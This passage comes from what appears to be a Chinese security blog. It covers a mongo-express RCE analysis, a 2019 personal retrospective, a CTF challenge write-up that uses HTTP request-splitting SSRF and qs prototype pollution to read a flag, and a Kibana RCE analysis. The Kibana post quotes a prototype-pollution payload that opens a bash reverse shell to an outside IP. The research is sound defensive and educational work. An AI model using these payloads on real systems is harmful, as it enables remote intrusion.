  vm.runInNewContext(&#39;doc = eval((&#39; + string + &#39;));&#39;, sandbox);

  return sandbox.doc;
};</code></pre><p>绕一下vm2逃逸出来沙箱即可，详情可以看这篇文章<a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html" target="_blank" rel="noopener">Sandboxing NodeJS is hard, here is why</a></p>
<h1 id="其他触发点"><a href="#其他触发点" class="headerlink" title="其他触发点"></a>其他触发点</h1><p>还有一处对mongo传值的地方也存在bson的问题，只是要校验是否存在数据库&amp;表名，利用起来没有checkValid的链方便，不过大多数mongo库都会存在local的库+start_log这个collection</p>
<p><img src="http://static.zybuluo.com/1160307775/eb2olwr7s4b04kmrsqhhvo1d/image_1dtr6dtch1t8kgrj1tq4c1jcivm.png" alt="image_1dtr6dtch1t8kgrj1tq4c1jcivm.png-375kB"></p>
<h1 id="需不需要验证"><a href="#需不需要验证" class="headerlink" title="需不需要验证"></a>需不需要验证</h1><p><code>mongo-express</code>把原始config对象写在config.default.js文件中。</p>
<p>漏洞分析中的poc需要进行权限鉴定，也就是poc中使用了请求头<code>Authorization: Basic YWRtaW46cGFzcw==</code>的原因。删掉后请求则会返回未授权</p>
<p><img src="http://static.zybuluo.com/1160307775/diptzrofl46yjfld44z1m025/image_1dto2g2p7kj6121c18ci1h4vq9i77.png" alt="image_1dto2g2p7kj6121c18ci1h4vq9i77.png-63.4kB"></p>
<p>但是如果以cli+指定用户形式启动服务端与mongo的连接时，则不需要授权也能打(个人认为这种方式更常见一点?)<br><img src="http://static.zybuluo.com/1160307775/so63suhp0hmj3thu9axhunmf/image_1du1fiujq1v2r1icnt5t3lctg69.png" alt="image_1du1fiujq1v2r1icnt5t3lctg69.png-524.8kB"></p>
<p>下面是关于mongo-express调用<code>basic-auth-connect</code>的认证简单分析</p>
<h2 id="认证流程分析"><a href="#认证流程分析" class="headerlink" title="认证流程分析"></a>认证流程分析</h2><p>程序入口逻辑是这样的，如果你程序启动的时候给一个-u&amp;-p参数则<code>config.useBasicAuth</code>为false，而<code>config.useBasicAuth</code>在加载配置的阶段默认为true</p>
<pre><code>if (commander.username &amp;&amp; commander.password) {
...
config.useBasicAuth = false;
}</code></pre><p>接着看文件<code>express-mongo/node_modules/mongo-express/lib/router.js</code>，根据<code>config.useBasicAuth</code>的值绑定一个<code>basicAuth</code>中间键，如果初始启动程序的时候没有-u/-p参数，则获取配置文件的username&amp;password(默认为admin:pass)来进行绑定</p>
<p><img src="http://static.zybuluo.com/1160307775/s00s25eqbwv3p7idk9ei0xjs/image_1dtntgtmr1cep1la29dnuaevf45d.png" alt="image_1dtntgtmr1cep1la29dnuaevf45d.png-591kB"></p>
<p>这里假设我们启动程序的时候默认不传入-u/-p，则步入<code>basicAuth</code>函数。这里定义了两个全局变量<code>username</code>&amp;<code>password</code>，来存储配置文件的用户名密码。</p>
<pre><code>module.exports = function basicAuth(callback, realm) {
  var username, password;

  // user / pass strings
  if (&#39;string&#39; == typeof callback) {
    username = callback;
    password = realm;
    if (&#39;string&#39; != typeof password) throw new Error(&#39;password argument required&#39;);
    realm = arguments[2];
    callback = function(user, pass){
      return user == username &amp;&amp; pass == password;
    }
  }

  realm = realm || &#39;Authorization Required&#39;;

  return function(req, res, next) {
    var authorization = req.headers.authorization;

    if (req.user) return next();
    if (!authorization) return unauthorized(res, realm);

    var parts = authorization.split(&#39; &#39;);

    if (parts.length !== 2) return next(error(400));

    var scheme = parts[0]
      , credentials = new Buffer(parts[1], &#39;base64&#39;).toString()
      , index = credentials.indexOf(&#39;:&#39;);

    if (&#39;Basic&#39; != scheme || index &lt; 0) return next(error(400));

    var user = credentials.slice(0, index)
      , pass = credentials.slice(index + 1);

    // async
    if (callback.length &gt;= 3) {
      callback(user, pass, function(err, user){
        if (err || !user)  return unauthorized(res, realm);
        req.user = req.remoteUser = user;
        next();
      });
    // sync
    } else {
      if (callback(user, pass)) {
        req.user = req.remoteUser = user;
        next();
      } else {
        unauthorized(res, realm);
      }
    }
  }
};</code></pre><p>在这之后的所有请求则必须都要有<code>req.headers.authorization</code>，来与全局变量<code>username</code>&amp;<code>password</code>比对进行认证，否则返回Unauthorized。</p>
<p>所以要想不进入<code>basicAuth</code>函数，只需要<code>config.useBasicAuth = false</code></p>
<h2 id="cli启动-未授权"><a href="#cli启动-未授权" class="headerlink" title="cli启动-未授权"></a>cli启动-未授权</h2><p>在mongo-express中还有一种启动方式，即用命令行传递参数。<br><img src="http://static.zybuluo.com/1160307775/ju6aewyf8sm5po3yu3r18urz/image_1dto26qrj1bge18bm6o41o13bn667.png" alt="image_1dto26qrj1bge18bm6o41o13bn667.png-44.5kB"></p>
<p>由于poc中，用docker拉的mongodb默认是未授权的形式，所以不需要-u&amp;-p来指定数据库的账号密码。但是实际环境中mongodb不太可能是未授权，所以我觉得以cli+参数启动服务的场景应该算是多见吧。</p>
<p>那么如果受害者指定了用户名&amp;密码去启动express-mongo，那么攻击者直接未授权就可以打(即不需要指定authoriza header)</p>
<p>不过在官方文档中给出了一句话:</p>
<pre><code>You can use the following environment variables to modify the container&#39;s configuration</code></pre><p>因为config.default.js默认会从环境变量中加载mongodb的用户名&amp;密码，这样无需参数就能启动服务，也顺便避免了未授权的问题</p>
<h1 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h1><p><a href="https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2" target="_blank" rel="noopener">https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2</a></p>
<p>在0.54.0中将bson.js中的vm依赖删除，改用<code>mongo-query-parser</code></p>
<p><img src="http://static.zybuluo.com/1160307775/abenhjn0g17fc8ef5jlgjvd2/image_1dtohg4gq10ehc9k100fbfq11ok8u.png" alt="image_1dtohg4gq10ehc9k100fbfq11ok8u.png-32.5kB"></p>
<h1 id="express分析"><a href="#express分析" class="headerlink" title="express分析"></a>express分析</h1><p>框架流程，使用一堆中间键</p>
<p>然后启动流程就是对中间键的层级调用，具体看这篇文章:<a href="https://shadowwood.me/2016/08/27/2016-08-27-express-origin-code-analysis/" target="_blank" rel="noopener">https://shadowwood.me/2016/08/27/2016-08-27-express-origin-code-analysis/</a></p>
<pre><code>核心的两步:
layer.handle_request(req, res, next);

/*
handle_request定义的就是express应用中的路由中间件请求处理函数，也就是例如app.get(‘/test’, function(req, res, next){})的操作最后的执行位置。
*/

/*
layer.handle_request会执行layer.route的dispatch操作，也就是在Route中派发路由最终执行到在express中定义的对应的路由操作函数，之后又执行next()就又到了这里的proto.stack中的下一个遍历操作。
*/


//handle_request原生是这样写的:

Layer.prototype.handle_request = function handle(req, res, next) {
  var fn = this.handle;

  if (fn.length &gt; 3) {
    // not a standard request handler
    return next();
  }

  try {
    fn(req, res, next);
  } catch (err) {
    next(err);
  }
};
</code></pre>
                
            </div>
            <div class="continue">
            <a href="/2020/01/03/CVE-2019-10758-mongo-expressRCE复现分析/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2020/01/01/My 2019/"> 
                    My 2019 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2020-01-01   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/博客文章/">博客文章</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="My-2019"><a href="#My-2019" class="headerlink" title="My 2019"></a>My 2019</h1><p>9102年的最后一天，按照国际惯例还是要记录一下。</p>
<p>从18年底到现在，大大小小的flag立了无数，自己都忘记完成了些什么，又有多少计划搁浅了。2019年最遗憾的是懒狗的本质还是没有改掉。</p>
<p>记得18年的这个时候我给自己定了个标签叫”蜕变”。因为18年是我大学入门安全的第一年，从一知半解到求知的过程像是破茧成蝶，充满坎坷但是有股奋斗的劲头。</p>
<p>然而，我想了很久也没能找到合适的词汇来描述19这一年，绞尽脑汁也没想起来今年都做过哪些有意义的事。无论是天南海北的打比赛、还是去学着挖洞，都比不上18年那股热情。好在当初立下的flag还是完成了一些，勉强也算是在技术上有一些进步，那干脆19年就叫”自定义”好了。</p>
<p>“自定义”了些什么呢？挖洞/审计/CTF？感觉每样都沾边，但是每样又没做到很好。懒狗的毛病又被无限化放大，干啥都是三分钟热度。举个例子来说：当初说要好好挖SRC，结果自动化的工具写了几天就去玩儿了，亦或者被其他琐事缠身(搬砖)，没有持之以恒。有位大师傅说得好，搞安全、挖漏洞，讲求的不光是门路多、思路广，还要学会坐得住、坐得稳。也希望自己来年可以学会如何<strong>专心</strong></p>
<p>记录一下2019年自己小赚人生第一桶金吧，虽然挣的确实不多，而且也特别累。上半年入手了自己的mbp，下半年猪肉涨价全用来吃饭了。可能是信安这个行业在今年突然变火的原因吧，还是搬了一些小砖，也浪费了不少时间。下半年以后太懒了也就不做这些了，主要原因还是想去多学点东西。通过hw或者一些其他项目对信安这个专业有了一些收入的认知。只要live as a tool man，还是能取得不错的薪资，但这必不可能是我们的归途。我是永远觉得金钱&lt;&lt;热情，希望自己在未来能够有能力说出这句话。</p>
<p>未来的一年要备战考研，博客大概率会长草，打算趁着寒假还有时间就多发几篇</p>
<p>20，继续做那个有点理想的普通人。</p>
<p>最后，祝这个世界依旧热闹，祝我仍是我。</p>

                
            </div>
            <div class="continue">
            <a href="/2020/01/01/My 2019/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/12/01/I-SOON2019-Membershop出题思路/"> 
                    I-SOON2019-Membershop出题思路 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-12-01   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/小组-学校/">小组/学校</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>今年是第二年出题，鉴于去年题目过于简单(去年我是真的sb且敷衍)，今年题目我憋了蛮长时间的(狗日的前端)，本希望做到这题的师傅们能有所收获。但是比赛跟各位师傅的时间还是冲突了，加之校赛的局限，实际也没多少人在打。比赛当天下午，Membershop容器的峰值也就5、6个的样子。其实题目并不是很难。</p>
<p>虽然最后没能达到自己预期的做题效果，算是有点点失望吧。但是我相信D0g3一定能把比赛办出去，感谢运维小哥@0akarma跟我一起调试动态容器的bug，关于全部的题目环境在:<a href="http://dao.ge/isoon2019" target="_blank" rel="noopener">http://dao.ge/isoon2019</a></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>题目开源地址:<a href="https://github.com/Hpd0ger/My_ctf_challenge/" target="_blank" rel="noopener">https://github.com/Hpd0ger/My_ctf_challenge/</a></p>
<p>修改index.js的server_ip为环境的ip</p>
<pre><code>docker-compose build
docker-compose up -d</code></pre><h1 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h1><p>登陆的时候过滤了admin，同时发现小写字符转换成了大写字母显示。结合set-cookie是koa的框架，很容易联想到后端使用<code>toUpperCase()</code>做转换，拉丁文越权登陆<code>admın</code></p>
<p><img src="http://static.zybuluo.com/1160307775/uevaveqvu1j6y2trkxfhf08u/image_1dr12lu22vs4iq44id1vuas21m.png" alt="image_1dr12lu22vs4iq44id1vuas21m.png-38.1kB"></p>
<p>登陆成功之后多了一个请求记录的功能，同时登陆成功后给出源码的地址</p>
<p><img src="http://static.zybuluo.com/1160307775/vmsnv0pzmurxdz2amugpr9br/image_1dr12phlo1hc31vqi17fvahuhgr16.png" alt="image_1dr12phlo1hc31vqi17fvahuhgr16.png-48.1kB"></p>
<p>拿到源码后简单看登陆逻辑<br><img src="http://static.zybuluo.com/1160307775/w044ik52f2r0v4qy9dztwfc2/image_1dmbk6vlo19d413cc13h8b108q913.png" alt="image_1dmbk6vlo19d413cc13h8b108q913.png-57.7kB"></p>
<p>逻辑根据传入的用户名<code>userName</code>会在登陆前经过一次检测<br><img src="http://static.zybuluo.com/1160307775/1sn9fw27548pjpjy0yfishg4/image_1dmbk45jltj28kro9c1kjdkshm.png" alt="image_1dmbk45jltj28kro9c1kjdkshm.png-65.8kB"></p>
<p>当传入的用户名包含<code>admin</code>时，则自动循环replace掉。在登陆成功的同时会把<code>username</code>写进session里，这里可以看到只有我们登陆了<code>admin</code>才有权限加载其他模版<br><img src="http://static.zybuluo.com/1160307775/8rvxorv0r9e3u03r6vjzyo2u/image_1dmbkcg89ijlmd61vef209bti1g.png" alt="image_1dmbkcg89ijlmd61vef209bti1g.png-160.3kB"></p>
<p>漏洞点在代码76-117行，它只允许请求以<code>http://127.0.0.1:3000/query</code>(后面拉到本地环境会改127.0.0.1这个地址，这是我本地debug)开头的url。输入其他开头的url会被<code>error url</code>，而且不存在任何host的绕过。当请求之后会被记录在sandbox的results.txt里面并且支持追加，sandbox根据ip建立<br><img src="http://static.zybuluo.com/1160307775/1fkgcdl7j1qc7v6dcjf6tdxm/image_1dmbkrtpt1pkv1q561o9kf2p10hj2n.png" alt="image_1dmbkrtpt1pkv1q561o9kf2p10hj2n.png-28.9kB"><br><img src="http://static.zybuluo.com/1160307775/sl6ii6qt9zm6mj7jrfhsetsp/image_1dmbku3fk399n211cvq49r1emt34.png" alt="image_1dmbku3fk399n211cvq49r1emt34.png-33.7kB"></p>
<p>因为query也是一个路由，那么这里就存在一个ssrf。如何bypass去请求其他路由呢？只需要用unicode编码并且分割http包，例如</p>
<pre><code>http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}</code></pre><p>url编码是16进制，\u{01xx}在http.get的时候不会进行percent encode，但是在buffer写入的时候会把xx解码。其中<code>\u{0173}\u{0161}\u{0176}\u{0165}</code>代表的是<code>save</code>，73617665是<code>save</code>的16进制表示。具体原理可以看:<a href="https://www.4hou.com/vulnerable/13637.html" target="_blank" rel="noopener">通过拆分请求来实现的SSRF攻击</a></p>
<p>接着就寻找一下其他路由存在的问题，可利用点在<code>/save</code></p>
<pre><code>home.get(&#39;/save&#39;,async(ctx)=&gt;{
    let ip = ctx.request.ip;
    let reqbody = {switch:false}
    reqbody = qs.parse(ctx.querystring,{allowPrototypes: false});

    if (ip.substr(0, 7) == &quot;::ffff:&quot;) {
        ip = ip.substr(7);
    }
    if (ip !== &#39;127.0.0.1&#39; &amp;&amp; ip !== server_ip) {
        ctx.status = 403;
        ctx.response.body = &#39;403: You are not the local user&#39;;
    }else {
        if(reqbody.switch === true &amp;&amp; reqbody.sandbox &amp;&amp; reqbody.opath &amp;&amp;fs.existsSync(reqbody.spath)){
            if(fs.existsSync(reqbody.sandbox)){
                paths.opath = fs.readdirSync(reqbody.sandbox)[0];
            }else if(fs.existsSync(reqbody.opath)){
                let buffer;
                tmp[reqbody.sandbox][&#39;opath&#39;] = reqbody.opath;
                if(/[flag]/.test(tmp[reqbody.sandbox][&#39;opath&#39;])){
                    buffer = tmp[reqbody.sandbox][&#39;opath&#39;].replace(/f|l|a|g/g,&#39;&#39;);
                }else{
                    buffer = reqbody.opath;
                }
            }
            let opath = paths.opath? paths.opath : buffer;
            let text = fs.readFileSync(opath, &#39;utf8&#39;);
            await WriteResults(reqbody.spath,text);

        }else{
            return false;
        }
    }
})</code></pre><p>这里大致有两个障碍点：</p>
<p>1、限制了本地127.0.0.1访问<br>-&gt;ssrf解决</p>
<p>2、通过qs包解析url参数存为对象，switch默认为flase，配置<code>allowPrototypes=false</code>，直接传递http参数不能覆盖switch。qs.parse() bypass for prototype pollution@qs&lt;6.3，参考链接:<a href="https://snyk.io/vuln/npm:qs:20170213" target="_blank" rel="noopener">Prototype Override Protection Bypass</a>，传参:<code>]=switch</code>绕过</p>
<p>3、解析获得的对象需要三个参数sandbox、opath、spath。代码逻辑就是如果存在sandbox那么就取sandbox下的第一个文件(即results.txt)读取后写入spath，否则读取自定义的opath，将结果写入spath(两者前提都是spath必须存在且可写，只有sandbox/result.txt满足要求)。但是自定义opath会替换所有的[flag]字段，不允许直接读flag。</p>
<p>这里存在判断的绕过。原型链污染sandbox下的一个文件为/flag，再去自定义读到spath里</p>
<pre><code>tmp[&#39;__proto__&#39;][&#39;opath&#39;] = &#39;/flag&#39;;
=&gt;
paths.opath = /flag</code></pre><p>构造一下就能把flag追加写入到sandbox/results.txt。poc如下，调整一下opath为flag地址，sandbox为自己的<code>md5(ip)</code>就行了：</p>
<pre><code>encodeURI(&quot;http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}?]=switch&amp;sandbox=__proto__&amp;opath=/flag&amp;spath=tmp/ab54a5cf83f67d827ecba68e394f9196&quot;)</code></pre>
                
            </div>
            <div class="continue">
            <a href="/2019/12/01/I-SOON2019-Membershop出题思路/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/11/20/从Kibana-RCE对nodejs子进程创建的思考/"> 
                    从Kibana-RCE对nodejs子进程创建的思考 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-11-20   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端安全/">前端安全</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="从Kibana-RCE对nodejs子进程创建的思考"><a href="#从Kibana-RCE对nodejs子进程创建的思考" class="headerlink" title="从Kibana-RCE对nodejs子进程创建的思考"></a>从Kibana-RCE对nodejs子进程创建的思考</h1><p>在前几天Kibana有一则关于原型链污染+子进程调用=&gt;rce的漏洞，跟进分析的时候发现child_process实现子进程创建确实存在trick。于是有了下文是对child_process的实现和Kibana RCE的一点思考。</p>
<h1 id="child-process建立子进程的实现"><a href="#child-process建立子进程的实现" class="headerlink" title="child_process建立子进程的实现"></a>child_process建立子进程的实现</h1><p>对于child_process大家应该都不陌生，它是nodejs内置模块，用于新建子进程，在CTF题目中也常使用<code>require(&#39;child_process&#39;).exec(&#39;xxx&#39;)</code>来RCE。</p>
<p>child_process内置了6个方法:execFileSync、execSync、fork、exec、execFile、spawn()</p>
<p>其中execFileSync()调用spawnSync()，execSync()调用spawnSync()，而spawnSync()调用spawn();exec()调用execFile()，而execFile()调用spawn();fork()调用spawn()。也就是说前6个方法最终都是调用spawn()，而spawn()的本质是创建ChildProcess的实例并返回。那我们直接对spawn这个方法进行分析</p>
<p>测试代码:</p>
<pre><code>const { spawn } = require(&#39;child_process&#39;);

spawn(&#39;whoami&#39;).stdout.on(&#39;data&#39;, (data) =&gt; {
    console.log(`stdout: ${data}`);
  });</code></pre><p>Node使用模块<code>child_process</code>建立子进程时，调用<code>用户层面的spawn</code>方法。初始化子进程的参数，进入方法<code>normalizeSpawnArguments</code></p>
<pre><code>var spawn = exports.spawn = function(/*file, args, options*/) {
  var opts = normalizeSpawnArguments.apply(null, arguments);
};</code></pre><p>跟进方法<code>normalizeSpawnArguments</code>，当options不存在时将options命为空对象。接着到下面最关键的一步，即获取env变量的方式。首先对options.env是否存在做了判断，如果options.env为undefined则将环境变量<code>process.env</code>的值复制给env。而后对envParivs这个数组进行push操作，其实就是env变量对应的键值对。</p>
<pre><code>function normalizeSpawnArguments(file, args, options) {
    ...//省略
  if (options === undefined)
    options = {};

    ...//省略
  var env = options.env || process.env;
  var envPairs = [];

  for (var key in env) {
    envPairs.push(key + &#39;=&#39; + env[key]);
  }

  _convertCustomFds(options);

  return {
    file: file,
    args: args,
    options: options,
    envPairs: envPairs
  };
}</code></pre><p><img src="http://static.zybuluo.com/1160307775/70133nyslwwm715le1gimvfi/image_1dpddlch71nmr1v2g1jgs1guv18nj2a.png" alt="image_1dpddlch71nmr1v2g1jgs1guv18nj2a.png-386.4kB"></p>
<p>这里就存在一个问题，options默认为空对象，那么它的<strong>任何属性</strong>都存在被污染的可能。所以只要能污染到<code>Object.prototype</code>，那么options就可以添加我们想要的任何属性，包括<code>options.env</code>。经过<code>normalizeSpawnArguments</code>封装并返回后，建立新的子进程<code>new ChildProcess()</code>，这里才算进入内部child_process的实现。</p>
<pre><code>var opts = normalizeSpawnArguments.apply(null, arguments);
var options = opts.options;
var child = new ChildProcess();

child.spawn({
file: opts.file,
args: opts.args,
cwd: options.cwd,
windowsVerbatimArguments: !!options.windowsVerbatimArguments,
detached: !!options.detached,
envPairs: opts.envPairs,
stdio: options.stdio,
uid: options.uid,
gid: options.gid
});</code></pre><p>我们直接看<code>ChildProcess.spawn</code>如何实现，也就是原生的spawn。核心代码逻辑是下面的两句，具体代码在<code>process_wrap.cc</code></p>
<pre><code>ChildProcess.prototype.spawn = function(options) {
  //...
  var err = this._handle.spawn(options);
  //...
  // Add .send() method and start listening for IPC data
  if (ipc !== undefined) setupChannel(this, ipc);
  return err;
};</code></pre><p><code>this._handle.spawn</code>调用了<code>process_wrap.cc</code>的spawn来生成子进程，是node子进程创建的底层实现，那我们看一下<code>process_wrap.cc</code>中对options的值进行了怎样的操作，。</p>
<pre><code>  static void Spawn(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {
    //获取js传过来的第一个option参数
    Local&lt;Object&gt; js_options = args[0]-&gt;ToObject(env-&gt;context()).ToLocalChecked();

    ...
    // options.env
    Local&lt;Value&gt; env_v =
        js_options-&gt;Get(context, env-&gt;env_pairs_string()).ToLocalChecked();
    if (!env_v.IsEmpty() &amp;&amp; env_v-&gt;IsArray()) {
      Local&lt;Array&gt; env_opt = Local&lt;Array&gt;::Cast(env_v);
      int envc = env_opt-&gt;Length();
      CHECK_GT(envc + 1, 0);  // Check for overflow.
      options.env = new char*[envc + 1];  // Heap allocated to detect errors.
      for (int i = 0; i &lt; envc; i++) {
        node::Utf8Value pair(env-&gt;isolate(),
                             env_opt-&gt;Get(context, i).ToLocalChecked());
        options.env[i] = strdup(*pair);
        CHECK_NOT_NULL(options.env[i]);
      }
      options.env[envc] = nullptr;
    }
    ...

    //调用uv_spawn生成子进程，并将父进程的event_loop传递过去
    int err = uv_spawn(env-&gt;event_loop(), &amp;wrap-&gt;process_, &amp;options);
    //省略
  }</code></pre><p>代码只截取了对env这个属性的操作，它将原先的envPairs进行封装。最后所有options带入<code>uv_spawn</code>来生成子进程，在<code>uv_spawn</code>中就是常规的fork()、waitpid()来控制进程的产生和资源释放，不过有一个非常重要的实现如下:</p>
<pre><code>//process.cc-&gt;uv_spawn()

execvp(options-&gt;file, options-&gt;args);</code></pre><p>execvp来执行任务，这里的options-&gt;file就是我们最初传给spawn的参数。比如我们的例子是<code>spawn(&#39;whoami&#39;)</code>，那么此时的file就是<code>whoami</code>，当然对于有参数的命令，则options-&gt;args与之对应。</p>
<h2 id="总结流程"><a href="#总结流程" class="headerlink" title="总结流程"></a>总结流程</h2><p>child_process创建子进程的流程看起来有些复杂，总结一下:</p>
<p>1、初始化子进程需要的参数，设置环境变量<br>2、fork()创建子进程，并用<code>execvp</code>执行系统命令。<br>3、ipc通信，输出捕捉</p>
<h1 id="Kibana-RCE"><a href="#Kibana-RCE" class="headerlink" title="Kibana-RCE"></a>Kibana-RCE</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先引用漏洞原作者的举例<br><img src="http://static.zybuluo.com/1160307775/bhalsijd98obd3c2u5bctmpz/image_1dpfrsth1180fc11uprr5j1r0713.png" alt="image_1dpfrsth1180fc11uprr5j1r0713.png-74.8kB"></p>
<p>node的官方文档中也能找到相同的用例:<a href="https://nodejs.org/api/cli.html#cli_node_options_options，node版本&gt;v8.0.0以后支持运行node时增加一个命令行参数NODE_OPTIONS，它能够包含一个js脚本，相当于include。" target="_blank" rel="noopener">https://nodejs.org/api/cli.html#cli_node_options_options，node版本&gt;v8.0.0以后支持运行node时增加一个命令行参数NODE_OPTIONS，它能够包含一个js脚本，相当于include。</a><br><img src="http://static.zybuluo.com/1160307775/dtx12zmomo7zm16h5mu9mvd8/image_1dpfrn6951t43bqt2prj21l9im.png" alt="image_1dpfrn6951t43bqt2prj21l9im.png-142.2kB"></p>
<p>在node进程启动的时候作为环境变量加载，通过打印process.env也能证明</p>
<pre><code>hpdoger@ChocoMacBook-Pro$ NODE_OPTIONS=&#39;--require ./evil.js&#39; node
success!!!

&gt; process.env.NODE_OPTIONS
&#39;--require ./evil.js&#39;</code></pre><p>如果我们能改变本地环境变量，则在node创建进程的时候就可以包含恶意语句。尝试用export来实现如下。<br><img src="http://static.zybuluo.com/1160307775/39a5x7o5hdzs8ql0pbo3cbho/image_1dpfsa9vei1kk2g1f5a1qchv531g.png" alt="image_1dpfsa9vei1kk2g1f5a1qchv531g.png-27.1kB"></p>
<p>事实证明，只要产生新进程就会加载一次本地环境变量，存储形式为process.env，若env中存在NODE_OPTIONS则进行相应的加载。但是这种需要bash漏洞就是耍流氓，于是作者想到了一种方法来污染process.env，也就是上文分析的env的获取，于是有了Kibana的poc</p>
<pre><code>.es(*).props(label.__proto__.env.AAAA=&#39;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.0.136/12345 0&gt;&amp;1&quot;);process.exit()//&#39;)
.props(label.__proto__.env.NODE_OPTIONS=&#39;--require /proc/self/environ&#39;)</code></pre><p>node运行时会把当前进程的env写进系统的环境变量，子进程也一样，在linux中存储为<code>/proc/self/environ</code>。通过污染env把恶意的语句写进/proc/self/environ。同时污染<code>process.NODE_OPTIONS</code>属性，使node在生成新进程的时候，包含我们构造的<code>/proc/self/environ</code>。具体操作就类似下面的用法<br><img src="http://static.zybuluo.com/1160307775/401us91ytoegl88xvsh0zj3a/image_1dpftrvc7qk59jmbjg17lk1f4b2d.png" alt="image_1dpftrvc7qk59jmbjg17lk1f4b2d.png-23.8kB"></p>
<p>污染了Object.env之后，利用Canvas生成新进程的时候会执行spawn从而RCE</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>最开始我并没有跟进Kibana的源码，只是把漏洞归结于:</p>
<pre><code>污染Object.env+创建子进程 =&gt; RCE</code></pre><p>于是我做了下面的测试，发现并没有像我想象中的输出evil.js中的内容，但是NODE_OPTIONS确实被写进了子进程的env。<br><img src="http://static.zybuluo.com/1160307775/pxl3up7lfbbj8966hg0t49cu/image_1dpfugpbejdu1cos1cra12pv11mr4p.png" alt="image_1dpfugpbejdu1cos1cra12pv11mr4p.png-102.2kB"></p>
<p>当我将进程建立换为<code>proc.fork()</code>时，则成功加载了evil.js并输出<br><img src="http://static.zybuluo.com/1160307775/400rh8hi6z4231wta13ll6l6/image_1dpfuioo51pov0m17et1as61ibf56.png" alt="image_1dpfuioo51pov0m17et1as61ibf56.png-126.9kB"></p>
<p>child_process.fork() 方法是 child_process.spawn() 的一个特例，专门用于衍生新的 Node.js 进程。 与 child_process.spawn() 一样返回 ChildProcess 对象。所以fork调用的是spawn来实现的子进程创建，那怎么会有这种情况？跟进一下fork看看实现有什么不同</p>
<pre><code>exports.fork = function(modulePath /*, args, options*/) {
    ...//省略
    options.execPath = options.execPath || process.execPath;
    return spawn(options.execPath, args, options);
}</code></pre><p>它处理了execPath这个属性，默认获取系统变量的process.execPath，再传入spawn，这里就是<code>node</code>。<br><img src="http://static.zybuluo.com/1160307775/3som47zksrvzoyeta5xufflt/image_1dpfv09ba1lqiq4eglf17fmdgc63.png" alt="image_1dpfv09ba1lqiq4eglf17fmdgc63.png-62.4kB"></p>
<p>而我们用spawn时，处理得到的file为<code>whoami</code><br><img src="http://static.zybuluo.com/1160307775/l68vdzmr5twb7bkh9dwtpw1i/image_1dpfvg05d1kth1o5n6adan9b8k6g.png" alt="image_1dpfvg05d1kth1o5n6adan9b8k6g.png-202.9kB"></p>
<p>上文分析child_process在子进程创建的最底层，会调用execvp执行命令执行file</p>
<pre><code>execvp(options-&gt;file, options-&gt;args);</code></pre><p>而上面poc核心就是<code>NODE_OPTIONS=&#39;--require /proc/self/environ&#39; node</code>，即bash调用了node去执行。所以此处的file值必须为node，否则无法将NODE_OPTIONS载入。而直接调用spawn函数时必须有file值，这也造成了第一种代码无法加载evil.js的情况<br><img src="http://static.zybuluo.com/1160307775/sj60p3ly3wetghpqf9oitvn5/image_1dpg0ajvt1b051icfapj1eaupi67a.png" alt="image_1dpg0ajvt1b051icfapj1eaupi67a.png-58.5kB"></p>
<p>经过测试exec、execFile函数无论传入什么命令，file的值都会为<code>/bin/sh</code>，因为参数shell默认为true。即使不传入options选项，这两个命令也会默认定义options，这也是child_process防止命令执行的一种途径。<br><img src="http://static.zybuluo.com/1160307775/5ed7bm1z723crkc08l0279cr/image_1dpg1kbn81deo1e4aeai11jebbn9.png" alt="image_1dpg1kbn81deo1e4aeai11jebbn9.png-26kB"></p>
